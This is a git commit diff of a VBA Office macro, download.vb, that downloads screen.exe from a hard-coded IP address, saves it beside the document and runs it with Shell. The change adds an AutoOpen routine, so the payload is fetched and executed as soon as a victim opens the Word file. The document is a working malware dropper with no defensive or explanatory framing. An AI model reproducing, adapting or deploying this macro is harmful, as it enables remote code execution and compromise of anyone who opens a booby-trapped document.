489f67594db164b1d3f7f03044d48799d2f4a684
black5ugar <37103491+black5ugar@users.noreply.github.com>
2022-06-30 14:33:33 +0800

    Update download.vb

--- office-macro/download.vb
+++ office-macro/download.vb
@@ -1,24 +1,26 @@
-Sub DownloadFileFromURL()
+Private Sub DownloadFileFromURL()
     Dim FileUrl As String
     Dim objeXmlHttpReq As Object
     Dim objStream As Object
     
-    FileUrl = "http://123456/Y2z7/screen.exe"
+    FileUrl = "http://1.14.126.233/YgeUfeT2z7/screen.exe"
     
     Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
     objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
     objXmlHttpReq.send
-
+    
     If objXmlHttpReq.Status = 200 Then
         Set objStream = CreateObject("ADODB.Stream")
         objStream.Open
         objStream.Type = 1
         objStream.Write objXmlHttpReq.responseBody
-        objStream.SaveToFile ThisWorkbook.Path & "\" & "screen.exe", 2
+        objStream.SaveToFile ThisDocument.Path & "\" & "screen.exe", 2
         objStream.Close
     End If
     
-    Shell ThisWorkbook.Path & "\" & "screen.exe"
+    Shell ThisDocument.Path & "\" & "screen.exe"
 End Sub
 
-
+Sub AutoOpen()
+    Call DownloadFileFromURL
+End Sub
